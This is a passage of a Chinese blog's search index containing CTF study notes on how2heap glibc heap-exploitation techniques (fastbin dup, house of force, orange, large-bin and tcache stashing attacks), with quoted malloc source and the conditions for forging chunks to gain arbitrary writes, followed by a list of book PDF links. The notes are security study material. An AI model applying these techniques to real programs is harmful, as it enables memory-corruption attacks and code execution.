<h3 id="相关源码"><a href="#相关源码" class="headerlink" title="相关源码"></a>相关源码</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// double free 检测，其中 old 为 fastbin 链首 chunk，也就是说，free fastchunk 时仅检测链首与释放 chunk</span></span><br><span class="line">	<span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">	  &#123;</span><br><span class="line">	    errstr = <span class="string">&quot;double free or corruption (fasttop)&quot;</span>;</span><br><span class="line">	    <span class="keyword">goto</span> errout;</span><br><span class="line">	  &#125;</span><br></pre></td></tr></table></figure>

<h2 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin_dup_consolidate"></a>fastbin_dup_consolidate</h2><p>该demo利用了该函数在fastbin中的机制：</p>
<ol>
<li>清空fastbin(inuse位归0)</li>
<li>合并fastbin</li>
<li>若后一块地址不为top chunk，则将合并的堆加入unsortedbin</li>
</ol>
<p>触发该函数的操作是，申请一个足够大的chunk。demo中申请了一个0x400大小的chunk，之后可以查看到p1被加入到了unsorted bin中。由于fastbin被清空，因此可以继续释放，使用dup进行攻击。</p>
<h3 id="相关源码-1"><a href="#相关源码-1" class="headerlink" title="相关源码"></a>相关源码</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 通过触发 malloc_consolidate 来对 fast_bin 进行清除</span></span><br><span class="line">  <span class="keyword">if</span> (in_smallbin_range (nb))&#123;…………&#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      idx = largebin_index (nb);</span><br><span class="line">      <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">        malloc_consolidate (av);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="malloc-consolidate"><a href="#malloc-consolidate" class="headerlink" title="malloc_consolidate"></a>malloc_consolidate</h4><p><a href="http://cn-sec.com/archives/285359.html">深度剖析malloc_consolidate</a></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">malloc_consolidate</span><span class="params">(mstate av)</span></span>;</span><br></pre></td></tr></table></figure>

<h2 id="fastbin-dup-into-stack"><a href="#fastbin-dup-into-stack" class="headerlink" title="fastbin_dup_into_stack"></a>fastbin_dup_into_stack</h2><p>该demo展示了通过dup操作后，将一个内存块多次放入fastbin后的一次攻击示例。即将该块的用户空间的第一个地址(fd)改写为指定地址，通过申请相同大小就能申请到该空间。</p>
<p>但是要是想从fastbin中取出chunk，会对chunk_size进行检测，而该demo将栈上伪造的chunk的size也改了，因此才能申请成功。</p>
<h3 id="相关源码-2"><a href="#相关源码-2" class="headerlink" title="相关源码"></a>相关源码</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// chunk_size 的检测是通过调用 do_check_malloced_chunk </span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house of spirit"></a>house of spirit</h2><p>demo在栈上构造了一块chunk，并展示了将其成功释放后能够重新申请到。</p>
<p>程序中展示了构造一个fastchunk的过程，为了通过检测，主要是满足条件：</p>
<ul>
<li>fake_chunk的<code>ISMMAP</code>位不能为1</li>
<li>空间对齐</li>
<li>伪造next_size不能小于2*<code>SIZE_SZ</code>(16 on x64)，同时也不能大于<code>av-&gt;system_mem</code>(128kb by default for the main arena)</li>
</ul>
<p>可以看出，demo想说明的是：可以通过在指定位置构造fake_chunk来实现修改该地址的值。关键在于能够绕过对应的检测。</p>
<h3 id="相关源码-3"><a href="#相关源码-3" class="headerlink" title="相关源码"></a>相关源码</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// next_size 检测</span></span><br><span class="line"><span class="keyword">if</span> (have_lock</span><br><span class="line">	    || (&#123; assert (locked == <span class="number">0</span>);</span><br><span class="line">		  mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">		  locked = <span class="number">1</span>;</span><br><span class="line">		  chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ</span><br><span class="line">		    || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem;</span><br><span class="line">	      &#125;))</span><br><span class="line">	  &#123;</span><br><span class="line">	    errstr = <span class="string">&quot;free(): invalid next size (fast)&quot;</span>;</span><br><span class="line">	    <span class="keyword">goto</span> errout;</span><br><span class="line">	  &#125;</span><br></pre></td></tr></table></figure>

<h2 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house of force"></a>house of force</h2><p>利用top chunk的分配机制，实现任意地址分配。</p>
<p>demo展示了通过该技巧更改bss段上的一块地址的内容。</p>
<h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><ol>
<li>能够控制top chunk的size域内容</li>
<li>能够自由控制分配大小</li>
</ol>
<h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>从top chunk中申请内存时，过程中会调用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">remainder      = chunk_at_offset(victim, nb);</span><br><span class="line">av-&gt;top        = remainder;</span><br></pre></td></tr></table></figure>

<p>(nb为用户的内存申请大小，victim为曾经top chunk的首地址)，最后实现效果为调整top chunk为减去偏移后的地址。</p>
<p>那么再更新av-&gt;top时就会将top chunk迁移到任意地址，然后再次从top chunk中申请时，就会申请到该地址空间。</p>
<p>但由于再申请前会进行一次检测，确定top chunk的大小足够分配这个大小。所以我们需要修改top chunk size为最大值(其本身为无符号数，因此为-1)即可。</p>
<h2 id="house-of-lore"><a href="#house-of-lore" class="headerlink" title="house of lore"></a>house of lore</h2><p>demo展示了ptmalloc的机制：非fastchunk释放后会被放入unsortedbin中，而下次再次申请并在fastbin和unsortedbin中并没找到合适的chunk时，会将unsortedbin中的chunk按大小放入对应的bins中。</p>
<p>从smallbins中取chunk时，程序只会检查其bk-&gt;fd是否为当前chunk，而不会检查chunk_size。</p>
<p>并且在samllbin中，取出chunk的顺序是FILO，因此我们伪造bk为指定地址，则能够被申请到。</p>
<h2 id="house-of-einherjar"><a href="#house-of-einherjar" class="headerlink" title="house of einherjar"></a>house of einherjar</h2><p>demo展示了ptmalloc的合并机制：释放chunk后会检测prev_inuse是否为0和prev_size是否满足(与绕过unlink检测差不多)，而这些与伪造的chunk(demo是在栈上伪造的)都成功的话就会先合并低地址再合并高地址chunk。合并是根据prev_size的长度来决定合并后chunk的首地址，且若高地址chunk为top chunk则会再与top chunk合并，而合并后top chunk的位置将会是之前我们伪造的chunk处，demo中为top  chunk因为合并到了栈上。</p>
<h2 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a>house of orange</h2><p>利用从top chunk中获取chunk的机制，不使用free函数就能达到得到一个free_chunk的功能。</p>
<h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>当用户申请chunk，并且这个chunk需要从top chunk中获得时，如果遇到top chunk为不能满足能分配需求的大小时。会增大top chunk，根据arena的类型(main  arena与non main arena)的不同会采用不同的扩展方法。而之前的top chunk会被放入unsorted bin中。</p>
<p>demo伪造了top chunk size为 0xc01，伪造top chunk size的条件：</p>
<ul>
<li>size 必须要对齐到内存页</li>
<li>size 要大于 MINSIZE(0x10)</li>
<li>size 要小于之后申请的 chunk size + MINSIZE(0x10)</li>
<li>size 的 prev inuse 位必须为 1</li>
</ul>
<p>然后申请 0x1000 大小的chunk，0x1000&gt;0xc01，因此top chunk 被放入了unsorted bin中。此时就类似于我们没有使用free函数就得到了一个位于unsorted bin中的chunk。</p>
<p>最后使用 <a href="http://116.205.191.26/2022/05/27/FSOP/">FSOP</a> 来 getshell。</p>
<h2 id="large-bin-attack"><a href="#large-bin-attack" class="headerlink" title="large_bin_attack"></a>large_bin_attack</h2><p>demo 演示了从 large_bin 中修改任意地址内容。</p>
<p>将 freed_largechunk 的 chunk_size 改为了 0x3f1, bk 改为 &amp;stack_val1-2, bk_nextsizes 改为了 stack_val2-4。</p>
<p>然后在执行 malloc(0x90) 时，修改了 stack_var1 与 stack_var2 的值。</p>
<h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>在执行 malloc，并且是从 unsortedbin 中分配 chunk 时，会先将 unsortedbin 中的 chunk 插入到对应的 bins 下，然后再根据申请的大小从对应的 bins 中申请。</p>
<p>而该攻击是在 chunk 的插入过程中，由于没有对 bk 与 bk-&gt;nextsize 进行检查而产生的。</p>
<h3 id="相关源码-4"><a href="#相关源码-4" class="headerlink" title="相关源码"></a>相关源码</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">……</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = largebin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">              <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">                  size |= PREV_INUSE;</span><br><span class="line">                  <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (bck-&gt;bk-&gt;size))</span><br><span class="line">                    &#123;</span><br><span class="line">                      fwd = bck;</span><br><span class="line">                      bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                      victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                    &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                      <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; fwd-&gt;size)</span><br><span class="line">                        &#123;</span><br><span class="line">                          fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                          assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                      <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) fwd-&gt;size)</span><br><span class="line">                        <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                        fwd = fwd-&gt;fd;</span><br><span class="line">                      <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                          victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                          fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                        &#125;</span><br><span class="line">                      bck = fwd-&gt;bk;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          mark_bin (av, victim_index);</span><br><span class="line">          victim-&gt;bk = bck;</span><br><span class="line">          victim-&gt;fd = fwd;</span><br><span class="line">          fwd-&gt;bk = victim;</span><br><span class="line">          bck-&gt;fd = victim;</span><br><span class="line">……</span><br></pre></td></tr></table></figure>

<p>在代码中，我们可以看到会执行一个循环，且由于<strong>一个序列的 large bin chunk 中 fd_nextsize 的方向是 size 变小的方向</strong>，因此该循环是遍历找出比当前 size 大的最小 chunk，存入 fwd。</p>
<p>此时，因为我们的 chunk_size 改为了 0x3f1，就不用遍历了。</p>
<p>接着执行<code>victim-&gt;fd_nextsize = fwd; victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize; fwd-&gt;bk_nextsize = victim;victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</code></p>
<p>由于我们将 p2-&gt;bk_nextsize 修改为了 &amp;stack_var2-4。因此，在 p3 的插入中会等同于执行了 p3-&gt;bk_nextsize=p2-&gt;bk_nextsize=&amp;stack_var2-4，p3-&gt;bk_nextsize-&gt;fd_nextsize=*(&amp;stack_var2-4+4)=p3。</p>
<p>接着执行<code>bck = fwd-&gt;bk;mark_bin (av, victim_index);victim-&gt;bk = bck;victim-&gt;fd = fwd;fwd-&gt;bk = victim;bck-&gt;fd = victim;</code></p>
<p>因为也将 p2-&gt;bk 修改为了 &amp;stack_var1-2，因此等同于执行了 p3-&gt;bk=bck=p2-&gt;bk=&amp;stack_var1-2，p3-&gt;bk-&gt;fd=p2-&gt;bk-&gt;fd=*(&amp;stack_var1-2+2)=p3。</p>
<p>最后的结果为两个栈上地址的值都修改为了 p3 的地址。</p>
<h2 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted_bin_attack"></a>unsorted_bin_attack</h2><p>demo 展示了改变栈上一个变量的值。</p>
<h3 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h3><p>从 unsorted_bin 中获取 chunk 时，不会对 bk 和 fd 进行检查就直接将该 chunk 从 unsorted_bin 中取出，然后将链表连上。</p>
<p>因此我们只需要改 bk 为 target_addr-0x10 即可。</p>
<h3 id="相关源码-5"><a href="#相关源码-5" class="headerlink" title="相关源码"></a>相关源码</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">……</span><br><span class="line">victim = unsorted_chunks (av)-&gt;bk</span><br><span class="line">……</span><br><span class="line">bck = victim-&gt;bk;</span><br><span class="line">……</span><br><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line">……</span><br></pre></td></tr></table></figure>

<h1 id="glibc-2-29"><a href="#glibc-2-29" class="headerlink" title="glibc_2.29"></a>glibc_2.29</h1><h2 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache_stashing_unlink_attack"></a>tcache_stashing_unlink_attack</h2><p>适用于 glibc-2.27, glibc-2.29 glibc-2.31</p>
<p>demo 首先创建了一个 fake_chunk($stack_var)，申请了9个 chunk，地址存储在 $chunk_lis 中，然后将其全部释放，前两个位于 unsorted_bin 中，后7个位于 tcache 中。在申请一个较大 chunk 后被放入 small_bin 中。继续申请，使得 tcache 未满。</p>
<p>修改 unsorted_bin 的最后一个 chunk 的 bk 指针为 target_addr-0x20。然后使用 calloc 申请一个 chunk(calloc 不会从 tcache 中取，realloc 也是)，就会将 small_bin 中的 chunk 放入 tcache，同时也完成了对 target_addr 的修改。</p>
<h3 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h3><p>从 small_bin 中获取 chunk 时，会将 small_bin 中剩余的 chunk 放入未满的对应 tcache 中。并且由于遍历的顺序是从链表的尾部开始，所以我们修改最后一个 chunk 的 bk 指针为指定地址后，就会被第二个放入 tcache 中。而在放入 tcache 之前，会有<code>bin-&gt;bk = bck;bck-&gt;fd = bin;</code>，这里的本意是将 chunk 取出，但由于没有检测而被利用，所以此时对 target_addr 的修改就已经完成了。</p>
<h4 id="相关源码-6"><a href="#相关源码-6" class="headerlink" title="相关源码"></a>相关源码</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line">          set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">          bin-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">        set_non_main_arena (victim);</span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">         stash them in the tcache.  */</span></span><br><span class="line">      <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">      <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">        &#123;</span><br><span class="line">          mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">          <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">             &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">        &#123;<span class="comment">// 如果smallbin里相对应大小的tcache没满的话，就链入tcache</span></span><br><span class="line">          <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">              bck = tc_victim-&gt;bk;</span><br><span class="line">              set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">            set_non_main_arena (tc_victim);</span><br><span class="line">              bin-&gt;bk = bck;</span><br><span class="line">              bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">              tcache_put (tc_victim, tc_idx);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>笔记</tag>
        <tag>heap</tag>
        <tag>how2heap</tag>
      </tags>
  </entry>
  <entry>
    <title>books</title>
    <url>/b00ks/index.html</url>
    <content><![CDATA[<p><a href="./%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB%E2%80%94%E9%93%BE%E6%8E%A5%E3%80%81%E8%A3%85%E8%BD%BD%E4%B8%8E%E5%BA%93.pdf">程序员的自我修养—链接、装载与库</a></p>
<p><a href="./C++%E5%8F%8D%E6%B1%87%E7%BC%96%E4%B8%8E%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E6%8F%AD%E7%A7%98.pdf">C++反汇编与逆向分析技术揭秘</a></p>
<p><a href="./Windows%20PE%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97%20%E6%88%9A%E5%88%A9.pdf">Windows PE权威指南</a></p>
<p><a href="./%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89%20%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B2%BE%E8%A6%81_%E5%AE%8C%E6%95%B4%E7%89%88PDF%E9%AB%98%E6%B8%85%E7%89%88.pdf">漏洞战争 软件漏洞分析精要</a></p>
<p><a href="./%E3%80%8A%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80(%E7%AC%AC3%E7%89%88)%20%E3%80%8B%E7%8E%8B%E7%88%BD%E8%91%97.pdf">汇编语言(第3版)</a></p>
<p><a href="./%5B%E5%9B%BE%E7%81%B5%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E4%B8%9B%E4%B9%A6%5D.%E7%A8%8B%E5%BA%8F%E6%98%AF%E6%80%8E%E6%A0%B7%E8%B7%91%E8%B5%B7%E6%9D%A5%E7%9A%84.pdf">程序是怎样跑起来的</a></p>
<p><a href="./%E9%93%BE%E6%8E%A5%E5%99%A8%E5%92%8C%E5%8A%A0%E8%BD%BD%E5%99%A8.pdf">链接器和加载器</a></p>
<p><a href="./%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F.pdf">深入理解计算机系统</a></p>
<p><a href="./%E7%BC%96%E7%A0%81%E2%80%94%E2%80%94%E9%9A%90%E5%8C%BF%E5%9C%A8%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%BD%AF%E7%A1%AC%E4%BB%B6%E8%83%8C%E5%90%8E%E7%9A%84%E8%AF%AD%E8%A8%80%E4%B8%8A.pdf">编码——隐匿在计算机软硬件背后的语言上</a></p>
<p><a href="./%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5%E4%B8%8E%E8%AE%BE%E8%AE%A1%20%E5%8E%9F%E4%B9%A6%E7%AC%AC5%E7%89%88.pdf">分布式系统概念与设计</a></p>
<p><a href="./Linux%E5%86%85%E6%A0%B8%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0.pdf">Linux内核设计与实现</a></p>
<p><a href="./WINDOWS%E5%86%85%E6%A0%B8%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E7%8E%B0.pdf">WINDOWS内核原理与实现</a></p>
]]></content>
  </entry>
  <entry>
    <title>categories</title>
    <url>/categories/index.html</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>tags</title>
    <url>/tags/index.html</url>
    <content><![CDATA[]]></content>
  </entry>
</search>
